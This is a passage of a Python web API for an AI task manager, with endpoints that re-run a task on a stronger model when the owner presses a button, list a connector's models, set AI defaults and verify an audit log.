    from . import config as _c
    with _c.once(): return _strong_again_read(task)


def _strong_again_read(task: dict) -> tuple:
    from . import general
    job = 'general' if general.handles(task) else 'coding'
    if job == 'general':
        saved = store.saved_session(task['TaskId']) or {}
        first = saved.get('Pick') or None
    else:
        last = store.last_transcript(task['TaskId']) or {}
        first = f"cli:{last['Brain']}" if last.get('Brain') else None
    pick, model = _brainroute().strong_for(store, job, task, first)
    return (job, pick, model) if pick else ('', '', '')


@app.post('/api/tasks/{task_id}/strong-again')
def strong_again(task_id: int):
    """RUN AGAIN ON THE STRONG MODEL (the owner, 2026-10-25): an agent that failed, or whose task triage was unsure of, run once
    more on a strong model, picking up from its saved work. A press, never automatic - an agent that can act may have done half
    its work, which is also why it picks up rather than starting blank - and nothing it drafts is sent without the owner's Send."""
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    if task.get('Status') == 'dropped': raise HTTPException(409, 'This task was dismissed.')
    job, pick, model = _strong_again_of(task)
    if not pick: raise HTTPException(422, "No AI here has a strong model - put one in the strong model box on its card in Settings.")
    from . import brainroute, continuity, general
    said = f"{brainroute.JOB_WORDS[job]} run again on {brainroute._said(store, pick)}'s strong model, {model}, as you pressed"
    brainroute.log(store, brainroute.Route(job, 'strong', pick, model, 'strong', [], 'you chose it', said[0].upper() + said[1:]), task_id)
    store.audit('task', task_id, 'strong-again', ACTOR, detail={'job': job, 'pick': pick, 'model': model})
    if job == 'general':
        if task.get('Status') not in ('open', 'waiting', 'in_progress'): store.update_task(task_id, {'Status': 'in_progress'}, ACTOR)
        def go():
            try: general.start_session(store, task_id, actor=ACTOR).send_prompt(continuity.STRONG_AGAIN_PROMPT, pick=pick, model=model, as_owner=False)
            except Exception as e: _walk_cannot(task_id, f'The session could not run again on the strong model: {e}. Your saved conversation is still here.')
        threading.Thread(target=go, daemon=True, name=f'strong-again-{task_id}').start()
        return {'started': True, 'taskId': task_id, 'kind': 'general', 'pick': pick, 'model': model}
    out = continue_task(task_id, CodeBody(brain=pick[4:], model=model, instruction=continuity.STRONG_AGAIN_PROMPT))
    return {'started': True, 'taskId': task_id, 'kind': 'coding', 'pick': pick, 'model': model, **(out if isinstance(out, dict) else {})}


@app.get('/api/ai/defaults')
def ai_defaults():
    """The three AI defaults with the model each will ACTUALLY run, and which screen owns it."""
    from . import aidefaults
    return aidefaults.state(store, cfg)


@app.get('/api/ai/models/{connector_id}')
def ai_models(connector_id: int):
    """Model ids the connector's own key can call, read from the provider (10 min cache, llm.connector_models). Failure is a 200
    with `error`: the picker falls back to its typed box, so a provider without a list endpoint costs nothing."""
    from . import llm
    out = llm.connector_models(store, connector_id)
    if out is None: raise HTTPException(404, 'no such AI connector')
    return out


class AiDefaultBody(BaseModel):
    slot: str
    value: str = None                   # None = leave the brain/agent alone, only touch the model
    model: str = None                   # None = leave alone; '' = clear back to the provider default
    effort: str = None
    strong_model: str = None            # None = leave alone; '' = no strong tier on this brain
    sensitive_ok: bool = None           # None = leave alone; the owner's "may read sensitive data" mark on this brain


@app.post('/api/ai/defaults')
def set_ai_default(body: AiDefaultBody):
    from . import aidefaults
    try: return aidefaults.apply(store, cfg, body.slot, body.value, body.model, body.effort, ACTOR, strong=body.strong_model, sensitive=body.sensitive_ok)
    except ValueError as e: raise HTTPException(422, str(e))


@app.get('/api/audit/verify')
def verify(): return store.verify_audit_chain()
